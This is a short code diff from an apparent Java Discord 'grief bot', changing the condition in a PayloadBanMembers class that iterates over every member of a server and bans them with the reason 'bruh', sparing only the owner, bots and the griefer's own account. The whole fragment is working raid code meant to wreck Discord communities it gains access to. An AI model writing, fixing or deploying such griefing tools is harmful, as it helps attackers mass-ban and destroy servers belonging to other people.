@@ -17,7 +17,7 @@ public class PayloadBanMembers implements Runnable {
 	public void run() {
 		for (Member member : guild.getMembers()) {
 			if (!(member.isOwner() || member.getUser().isBot()
-					|| member.getId() == GriefBot.getInstance().getGrieferUserID()) && isBotRoleHigher(member)) {
+					|| member.getId() == GriefBot.getInstance().getGrieferUserID()) || isBotRoleHigher(member)) {
 				try {
 					member.getGuild().ban(member, 0, "bruh").queue();
 				} catch (Exception e) {
